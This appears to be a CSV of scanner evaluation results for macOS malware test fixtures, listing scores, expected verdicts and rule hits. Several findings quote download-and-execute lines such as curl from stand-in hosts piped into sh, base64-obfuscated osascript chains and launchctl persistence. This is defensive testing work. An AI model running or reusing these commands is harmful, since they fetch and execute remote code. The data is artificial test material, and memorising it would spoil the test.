run_id,sample_id,group,subtype,fixture_kind,path,detected_type,score,verdict,expected_verdict,expected_score_min,expected_score_max,matched_verdict,matched_score_range,mismatch_reason,status,error_code,analysis_duration_ms,timestamp,has_findings,error,analysis_summary,finding_delta_total,findings
"2026-03-14T13-54-59Z-e5cff3","noisy_shell_update_checker_02","noisy_benign","shell","file_fixture","noisy_benign/shell/noisy_shell_update_checker_02.sh","shellScript","48","malicious","benign_noisy","12","30","false","false","verdict_too_high","completed","","1961","2026-03-14T13:56:50.798Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.974，风险桶 高危恶意，评分调整 +48。","48","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.974)."
"2026-03-14T13-54-59Z-e5cff3","replay_clean_app_lifecycle_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_app_lifecycle_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","7","2026-03-14T13:56:50.806Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-14T13-54-59Z-e5cff3","replay_clean_backup_flow_01","replay_clean","replay_json","replay_json","replay/clean/replay_clean_backup_flow_01.json","jsonReplay","0","unknown","clean","0","15","false","true","verdict_too_low","completed","","1","2026-03-14T13:56:50.807Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-14T13-54-59Z-e5cff3","replay_clean_js_fetch_cache_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_js_fetch_cache_02.json","jsonReplay","10","clean","","","","","","expectation_missing","completed","","1","2026-03-14T13:56:50.809Z","true","","Replay evaluation: clean (score 10)","10","[network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-14T13-54-59Z-e5cff3","replay_clean_pkg_appsupport_install_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_pkg_appsupport_install_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","2","2026-03-14T13:56:50.811Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-14T13-54-59Z-e5cff3","replay_clean_python_scan_report_02","replay_clean","jsonReplay","replay_json","replay/clean/replay_clean_python_scan_report_02.json","jsonReplay","0","unknown","","","","","","expectation_missing","completed","","1","2026-03-14T13:56:50.813Z","false","","Replay evaluation: unknown (score 0)","0",""
"2026-03-14T13-54-59Z-e5cff3","replay_malicious_app_bash_curl_persist_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_app_bash_curl_persist_02.json","jsonReplay","75","malicious","","","","","","expectation_missing","completed","","3","2026-03-14T13:56:50.817Z","true","","Replay evaluation: malicious (score 75)","75","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-14T13-54-59Z-e5cff3","replay_malicious_app_osascript_chain_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_app_osascript_chain_02.json","jsonReplay","25","clean","","","","","","expectation_missing","completed","","4","2026-03-14T13:56:50.821Z","true","","Replay evaluation: clean (score 25)","25","[process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-14T13-54-59Z-e5cff3","replay_malicious_chain_01","replay_malicious","replay_json","replay_json","replay/malicious/replay_malicious_chain_01.json","jsonReplay","100","malicious","malicious","85","100","true","true","","completed","","1","2026-03-14T13:56:50.823Z","true","","Replay evaluation: malicious (score 100)","110","[script.download_execute_chain] 可疑脚本下载执行链 (+35) | [persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-14T13-54-59Z-e5cff3","replay_malicious_pkg_postinstall_multiegres_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_pkg_postinstall_multiegres_02.json","jsonReplay","95","malicious","","","","","","expectation_missing","completed","","4","2026-03-14T13:56:50.827Z","true","","Replay evaluation: malicious (score 95)","95","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [persistence.shell_profile] Shell Profile 持久化 (+20) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-14T13-54-59Z-e5cff3","replay_malicious_python_subprocess_priv_02","replay_malicious","jsonReplay","replay_json","replay/malicious/replay_malicious_python_subprocess_priv_02.json","jsonReplay","25","clean","","","","","","expectation_missing","completed","","3","2026-03-14T13:56:50.830Z","true","","Replay evaluation: clean (score 25)","25","[process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-14T13-54-59Z-e5cff3","replay_suspicious_app_shell_egress_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_app_shell_egress_02.json","jsonReplay","60","malicious","","","","","","expectation_missing","completed","","2","2026-03-14T13:56:50.832Z","true","","Replay evaluation: malicious (score 60)","60","[script.download_execute_chain] 可疑脚本下载执行链 (+35) | [process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-14T13-54-59Z-e5cff3","replay_suspicious_persistence_attempt_01","replay_suspicious","replay_json","replay_json","replay/suspicious/replay_suspicious_persistence_attempt_01.json","jsonReplay","50","suspicious","suspicious","60","80","true","false","score_too_low","completed","","1","2026-03-14T13:56:50.834Z","true","","Replay evaluation: suspicious (score 50)","50","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-14T13-54-59Z-e5cff3","replay_suspicious_pkg_persistence_mirror_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_pkg_persistence_mirror_02.json","jsonReplay","70","malicious","","","","","","expectation_missing","completed","","2","2026-03-14T13:56:50.836Z","true","","Replay evaluation: malicious (score 70)","70","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [persistence.shell_profile] Shell Profile 持久化 (+20) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-14T13-54-59Z-e5cff3","replay_suspicious_python_decode_plist_mirror_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_python_decode_plist_mirror_02.json","jsonReplay","65","malicious","","","","","","expectation_missing","completed","","1","2026-03-14T13:56:50.838Z","true","","Replay evaluation: malicious (score 65)","65","[persistence.launch_agent_write] 写入 LaunchAgent / LaunchDaemon (+30) | [script.obfuscation_base64_exec] 混淆 / Base64 解码执行 (+15) | [filesystem.sensitive_path_change] 修改敏感路径 (+20)"
"2026-03-14T13-54-59Z-e5cff3","replay_suspicious_shell_fanout_tmp_egress_02","replay_suspicious","jsonReplay","replay_json","replay/suspicious/replay_suspicious_shell_fanout_tmp_egress_02.json","jsonReplay","25","clean","","","","","","expectation_missing","completed","","3","2026-03-14T13:56:50.842Z","true","","Replay evaluation: clean (score 25)","25","[process.spawn_shell] 样本拉起 Shell 子进程 (+15) | [network.remote_connect] 运行期远程网络连接 (+10)"
"2026-03-14T13-54-59Z-e5cff3","suspicious_applescript_auth_lure_prompt_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_auth_lure_prompt_02.applescript","appleScript","22","clean","suspicious","35","52","false","false","verdict_too_low","completed","","1848","2026-03-14T13:56:52.691Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.593，风险桶 可疑，评分调整 +22。","22","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.593)."
"2026-03-14T13-54-59Z-e5cff3","suspicious_applescript_doshell_echo_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_doshell_echo_02.applescript","appleScript","100","malicious","suspicious","55","72","false","false","verdict_too_high","completed","","1891","2026-03-14T13:56:54.583Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 84/100。 AI 模型结果：malicious，恶意概率 0.512，风险桶 低度可疑，评分调整 +22。","103","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [applescript.do_shell_script] AppleScript 调用 shell [high] L2-2 Δ20: do shell script ""echo '[dry-run] would run: "" & suspiciousCmd & ""'"" | [intel.regexp.command_combo] Threat Intel regexp [high] L1-1 Δ14: curl -fssl https://example.com/dropper.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L1-1 Δ14: curl -fssl https://example.com/dropper.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/dropper.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/dropper.sh | sh | RandomForest model flagged sample as high risk (malicious, p=0.512). | Threat intel [regexp] hit: curl -fssl https://example.com/dropper.sh | Threat intel [regexp] hit: curl -fssl https://example.com/dropper.sh | sh | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_applescript_keystroke_sim_01","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_keystroke_sim_01.applescript","appleScript","22","clean","suspicious","58","78","false","false","verdict_too_low","completed","","1852","2026-03-14T13:56:56.436Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.616，风险桶 可疑，评分调整 +22。","22","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.616)."
"2026-03-14T13-54-59Z-e5cff3","suspicious_applescript_system_settings_text_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_system_settings_text_02.applescript","appleScript","22","clean","suspicious","35","50","false","false","verdict_too_low","completed","","1847","2026-03-14T13:56:58.284Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.654，风险桶 可疑，评分调整 +22。","22","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.654)."
"2026-03-14T13-54-59Z-e5cff3","suspicious_applescript_terminal_download_print_02","suspicious","applescript","file_fixture","suspicious/applescript/suspicious_applescript_terminal_download_print_02.applescript","appleScript","87","suspicious","suspicious","52","70","true","false","score_too_high","completed","","1859","2026-03-14T13:57:00.143Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 91/100。 AI 模型结果：benign，恶意概率 0.436，风险桶 低度可疑，评分调整 -4。","84","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [applescript.terminal_control] 控制 Terminal 应用 [medium] L1-1 Δ12: tell application ""Terminal"" | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/stage.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L3-3 Δ14: curl -fssl https://example.com/stage.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/stage.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/stage.sh | sh | Threat intel [regexp] hit: curl -fssl https://example.com/stage.sh | Threat intel [regexp] hit: curl -fssl https://example.com/stage.sh | sh | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_hybrid_app_bundle_fixture_02","suspicious","hybrid_app","hybrid_directory_fixture","suspicious/hybrid/SyntheticSuspiciousFixture_02.app","appBundle","48","malicious","suspicious","60","78","false","false","verdict_too_high","completed","","2074","2026-03-14T13:57:02.217Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.994，风险桶 高危恶意，评分调整 +48。","48","未获取到 Entitlements，权限边界不可完全判断 | RandomForest model flagged sample as high risk (malicious, p=0.994). | Quick probe skipped deep bundle expansion, full codesign/spctl checks, and exhaustive embedded script recursion. | codesign_failed: Quick probe skipped deep bundle expansion, full codesign/spctl checks, and exhaustive embedded script recursion."
"2026-03-14T13-54-59Z-e5cff3","suspicious_hybrid_chain_sim_01","suspicious","hybrid","hybrid_manifest_fixture","suspicious/hybrid/suspicious_hybrid_chain_sim_01.json","appleScript","100","malicious","suspicious","65","88","false","false","verdict_too_high","completed","","2216","2026-03-14T13:57:04.434Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 97/100。 AI 模型结果：malicious，恶意概率 0.884，风险桶 恶意倾向明显，评分调整 +36。","130","Threat intel matched 2 unified rules | Hash rules are always evaluated for every file | Threat intel profile matched 2 rules | [intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | [intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -s https://evil.example.invalid/dropper | sh | Suspicious keywords: osascript, curl , regexp:curl -s https://evil.example.invalid/dropper, regexp:curl -s https://evil.example.invalid/dropper | sh | RandomForest model flagged sample as high risk (malicious, p=0.884). | Threat intel [regexp] hit: curl -s https://evil.example.invalid/dropper | Threat intel [regexp] hit: curl -s https://evil.example.invalid/dropper | sh | Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage. | generic_partial: Manifest/descriptor fixture uses lightweight parsing and does not represent full app/pkg execution coverage."
"2026-03-14T13-54-59Z-e5cff3","suspicious_hybrid_dmg_mirror_fixture_02","suspicious","hybrid_dmg","hybrid_directory_fixture","suspicious/hybrid/suspicious_hybrid_dmg_mirror_fixture_02","archive","90","malicious","malicious","70","80","true","false","score_too_high","completed","","5362","2026-03-14T13:57:09.797Z","true","","静态证据链：检测到 curl 输出直接通过管道进入 sh/bash/zsh，属于典型远程代码直接执行链。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Malicious（高风险），得分 90/100。","74","未发现高风险规则命中 | 检测到远程下载执行链 | [shell.curl_pipe_sh] curl 下载后直接管道执行 [critical] L5-5 Δ35: echo ""[string] curl -fsSL https://example.com/bootstrap.sh | sh"" | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | sh | [app] 未获取到 Entitlements，权限边界不可完全判断 | RandomForest prediction output is incomplete; skipped model fusion. | generic_partial: RandomForest prediction output is incomplete; skipped model fusion."
"2026-03-14T13-54-59Z-e5cff3","suspicious_hybrid_pkg_fixture_02","suspicious","hybrid_pkg","hybrid_directory_fixture","suspicious/hybrid/suspicious_hybrid_pkg_fixture_02","pkg","22","clean","malicious","68","80","false","false","verdict_too_low","completed","","2566","2026-03-14T13:57:12.363Z","true","","静态证据链：Package pre/post install scripts can execute with installer privileges.；Package pre/post install scripts can execute with installer privileges.。最终 Clean（低风险），得分 22/100。","22","pkg fixture contains install script entries | Quick probe skipped full payload traversal for pkg-like directory. | RandomForest prediction output is incomplete; skipped model fusion. | generic_partial: Quick probe skipped full payload traversal for pkg-like directory. | generic_partial: RandomForest prediction output is incomplete; skipped model fusion."
"2026-03-14T13-54-59Z-e5cff3","suspicious_js_buffer_obfuscation_sim_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_buffer_obfuscation_sim_02.js","javaScript","100","malicious","suspicious","55","74","false","false","verdict_too_high","completed","","1803","2026-03-14T13:57:14.167Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。。最终 Suspicious（可疑），得分 99/100。 AI 模型结果：malicious，恶意概率 0.796，风险桶 恶意倾向明显，评分调整 +30。","126","检测到混淆或编码逃逸 | Threat intel profile matched 2 rules | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const encoded = Buffer.from(payload, 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L4-4 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8'); | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ18: launchctl bootstrap | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ18: launchctl bootstrap gui/501 | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl bootstrap | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [high] L0-0 Δ18: launchctl bootstrap gui/501 | RandomForest model flagged sample as high risk (malicious, p=0.796). | Threat intel [regexp] hit: launchctl bootstrap | Threat intel [regexp] hit: launchctl bootstrap gui/501 | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_js_child_process_echo_chain_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_child_process_echo_chain_02.js","javaScript","100","malicious","suspicious","55","72","false","false","verdict_too_high","completed","","1825","2026-03-14T13:57:15.992Z","true","","静态证据链：检测到 child_process 模块使用，可直接执行 shell 或二进制命令。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 100/100。 AI 模型结果：malicious，恶意概率 0.846，风险桶 恶意倾向明显，评分调整 +36。","140","检测到脚本高风险行为特征 | Threat intel profile matched 2 rules | [javascript.child_process] Node child_process 执行链 [high] L2-2 Δ22: const { execFile } = require('child_process'); | [intel.regexp.command_combo] Threat Intel regexp [high] L4-4 Δ14: curl -fssl https://example.com/a.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L4-4 Δ14: curl -fssl https://example.com/a.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/a.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/a.sh | sh | RandomForest model flagged sample as high risk (malicious, p=0.846). | Threat intel [regexp] hit: curl -fssl https://example.com/a.sh | Threat intel [regexp] hit: curl -fssl https://example.com/a.sh | sh | Script analyzer detected 3 high-severity findings. | generic_partial: Script analyzer detected 3 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_js_download_execute_sim_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_download_execute_sim_02.js","javaScript","36","suspicious","suspicious","60","78","true","false","score_too_low","completed","","1938","2026-03-14T13:57:17.931Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.897，风险桶 恶意倾向明显，评分调整 +36。","36","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.897)."
"2026-03-14T13-54-59Z-e5cff3","suspicious_js_eval_decode_message_02","suspicious","js","file_fixture","suspicious/js/suspicious_js_eval_decode_message_02.js","javaScript","95","malicious","suspicious","58","76","false","false","verdict_too_high","completed","","1815","2026-03-14T13:57:19.747Z","true","","静态证据链：检测到 eval/Function 构造动态代码执行，存在混淆载荷风险。；发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。；发现 base64 编码还原逻辑，可能用于隐藏关键执行片段。。最终 Suspicious（可疑），得分 65/100。 AI 模型结果：malicious，恶意概率 0.729，风险桶 可疑，评分调整 +30。","92","检测到混淆或编码逃逸 | [javascript.eval] JavaScript 动态执行(eval) [high] L4-4 Δ22: const value = eval(decoded); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""'synthetic harmless eval message'"", 'utf8').toString('base64'); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, 'base64').toString('utf8'); | RandomForest model flagged sample as high risk (malicious, p=0.729). | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_js_obfuscation_sim_01","suspicious","js","file_fixture","suspicious/js/suspicious_js_obfuscation_sim_01.js","javaScript","100","malicious","suspicious","60","80","false","false","verdict_too_high","completed","","1840","2026-03-14T13:57:21.588Z","true","","静态证据链：发现 Node 脚本通过 osascript 或 shell 触发跨语言命令链。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 100/100。 AI 模型结果：malicious，恶意概率 0.750，风险桶 恶意倾向明显，评分调整 +30。","178","检测到混淆或编码逃逸 | Threat intel profile matched 3 rules | [javascript.osascript_shell_chain] JavaScript 调用 osascript/shell [high] L2-2 Δ24: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L2-2 Δ14: const encoded = Buffer.from(""osascript -e 'do shell script \""curl https://evil.example.invalid\""'"", ""utf8"").toString(""base64""); | [javascript.base64_obfuscation] Buffer/base64 混淆痕迹 [medium] L3-3 Δ14: const decoded = Buffer.from(encoded, ""base64"").toString(""utf8""); | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ14: curl https://evil.example.invalid\ | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ14: osascript -e 'do shell script | [intel.regexp.command_combo] Threat Intel regexp [high] L2-2 Δ14: osascript -e 'do shell script \""curl | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl https://evil.example.invalid\ | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: osascript -e 'do shell script | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: osascript -e 'do shell script \""curl | RandomForest model flagged sample as high risk (malicious, p=0.750). | Threat intel [regexp] hit: curl https://evil.example.invalid\ | Threat intel [regexp] hit: osascript -e 'do shell script | Threat intel [regexp] hit: osascript -e 'do shell script \""curl | Script analyzer detected 4 high-severity findings. | generic_partial: Script analyzer detected 4 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_python_download_would_execute_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_download_would_execute_02.py","pythonScript","36","suspicious","suspicious","55","72","true","false","score_too_low","completed","","1804","2026-03-14T13:57:23.392Z","true","","静态证据不足，当前判定 Clean（低风险），得分 0/100。 AI 模型结果：malicious，恶意概率 0.839，风险桶 恶意倾向明显，评分调整 +36。","36","未发现高风险规则命中 | No high-risk script rule hit | RandomForest model flagged sample as high risk (malicious, p=0.839)."
"2026-03-14T13-54-59Z-e5cff3","suspicious_python_downloader_sim_01","suspicious","python","file_fixture","suspicious/python/suspicious_python_downloader_sim_01.py","pythonScript","100","malicious","suspicious","62","82","false","false","verdict_too_high","completed","","1841","2026-03-14T13:57:25.233Z","true","","静态证据链：检测到 base64/marshal/zlib 或 PyInstaller 痕迹，存在代码隐藏风险。；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 100/100。 AI 模型结果：malicious，恶意概率 0.823，风险桶 恶意倾向明显，评分调整 +36。","165","检测到混淆或编码逃逸 | Threat intel profile matched 2 rules | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L2-2 Δ14: import base64 | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L9-9 Δ14: encoded = base64.b64encode(b""curl -L https://evil.example.invalid/payload.sh | sh"").decode(""ascii"") | [python.obfuscation] 编码/压缩混淆痕迹 [medium] L10-10 Δ14: decoded = base64.b64decode(encoded).decode(""utf-8"") | [intel.regexp.command_combo] Threat Intel regexp [high] L9-9 Δ14: curl -l https://evil.example.invalid/payload.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L9-9 Δ14: curl -l https://evil.example.invalid/payload.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -l https://evil.example.invalid/payload.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -l https://evil.example.invalid/payload.sh | sh | RandomForest model flagged sample as high risk (malicious, p=0.823). | Threat intel [regexp] hit: curl -l https://evil.example.invalid/payload.sh | Threat intel [regexp] hit: curl -l https://evil.example.invalid/payload.sh | sh | Script analyzer detected 2 high-severity findings. | generic_partial: Script analyzer detected 2 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_python_echo_chain_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_echo_chain_02.py","pythonScript","100","malicious","suspicious","52","68","false","false","verdict_too_high","completed","","1871","2026-03-14T13:57:27.105Z","true","","静态证据链：Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].；Matched unified threat profile section [regexp].。最终 Suspicious（可疑），得分 95/100。 AI 模型结果：malicious，恶意概率 0.782，风险桶 恶意倾向明显，评分调整 +30。","122","检测到混淆或编码逃逸 | Threat intel profile matched 2 rules | [python.os_system] os.system 命令执行 [high] L6-6 Δ20: os.system(f'echo ""[dry-run][os.system] would run: {chain}""') | [python.subprocess_exec] subprocess 外部进程执行 [high] L7-7 Δ20: subprocess.run([""echo"", ""[dry-run][subprocess] would invoke staged shell chain""], check=True) | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | [intel.regexp.command_combo] Threat Intel regexp [high] L5-5 Δ14: curl -fssl https://example.com/bootstrap.sh | sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/bootstrap.sh | [config.rule.file.intel.regexp.command_combo] Threat Intel regexp [medium] L0-0 Δ14: curl -fssl https://example.com/bootstrap.sh | sh | RandomForest model flagged sample as high risk (malicious, p=0.782). | Threat intel [regexp] hit: curl -fssl https://example.com/bootstrap.sh | Threat intel [regexp] hit: curl -fssl https://example.com/bootstrap.sh | sh | Script analyzer detected 4 high-severity findings. | generic_partial: Script analyzer detected 4 high-severity findings."
"2026-03-14T13-54-59Z-e5cff3","suspicious_python_launchagent_mirror_02","suspicious","python","file_fixture","suspicious/python/suspicious_python_launchagent_mirror_02.py","pythonScript","87","malicious","suspicious","52","68","false","false","verdict_too_high","completed","","1870","2026-03-14T13:57:28.975Z","true","","静态证据链：Matched unified threat profile section [url].；Matched unified threat profile section [url].；Keyword-level static signal; requires context to determine impact.。最终 Clean（低风险），得分 39/100。 AI 模型结果：malicious，恶意概率 0.971，风险桶 高危恶意，评分调整 +48。","84","检测到脚本高风险行为特征 | Threat intel profile matched 1 rules | [intel.url.known_malicious_host] Threat Intel url [high] L10-10 Δ20: www.apple.com | [config.rule.file.intel.url.known_malicious_host] Threat Intel url [high] L0-0 Δ20: www.apple.com | RandomForest model flagged sample as high risk (malicious, p=0.971). | Threat intel [url] hit: www.apple.com | Script analyzer detected 1 high-severity findings. | generic_partial: Script analyzer detected 1 high-severity findings."
